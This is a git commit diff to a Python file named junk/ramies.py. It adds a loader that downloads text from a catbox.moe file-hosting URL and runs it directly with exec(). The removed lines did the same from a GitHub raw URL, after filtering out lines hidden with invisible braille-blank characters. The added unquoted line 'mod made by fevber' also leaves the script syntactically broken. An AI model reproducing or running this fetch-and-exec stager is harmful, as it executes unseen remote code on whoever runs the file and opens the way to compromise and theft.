17e84a19c05fae55e723bff6aceedf508d4a6da6
Fevber <nah.id.win.286h@gmail.com>
2026-08-19 09:43:22 -0600

    re

--- junk/ramies.py
+++ junk/ramies.py
@@ -1,16 +1,11 @@
+mod made by fevber
+
 import urllib.request
 import subprocess
 import sys
 import os
-import tempfile
 
-url = 'https://raw.githubusercontent.com/fevberr/fevberr/refs/heads/main/junk/ramies.py'
+url = 'https://files.catbox.moe/xfa0x3.txt'
 req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
-raw = urllib.request.urlopen(req).read().decode()
-
-lines = raw.splitlines()
-clean_lines = [line for line in lines if not line.startswith('\u2800') and line.strip() and not line.strip().startswith('#')]
-
-cleaned = '\n'.join(clean_lines)
-
-exec(cleaned)
+code = urllib.request.urlopen(req).read().decode()
+exec(code)
